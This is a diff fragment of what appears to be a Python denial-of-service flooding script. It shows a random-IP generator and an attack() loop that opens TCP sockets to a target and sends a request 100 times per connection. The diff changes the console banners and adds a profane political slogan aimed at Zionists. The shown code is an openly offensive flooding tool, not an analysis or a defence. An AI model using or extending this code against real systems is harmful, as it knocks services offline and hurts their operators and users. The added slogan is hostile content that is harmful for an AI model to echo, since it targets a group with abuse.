@@ -49,7 +49,8 @@ def randomip():
   randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
   return(randip)
 
-print("\033[33mSyarting the attack \033[32m" +str(url)+ "\033[91m 0verload")
+
+print("\033[48;5;5mFUCK 210N15T \033[32m \033[38;5;7mFREE PALESTINEand ")
 
 
 time.sleep(1)
@@ -65,7 +66,7 @@ def attack():
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
-      #Attack starts here
+      print("\033[48;5;4mStarting attack \033[0m \033[38;5;2m" +str(url)+ " \033[91m0nfire..!!\033[0m")
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
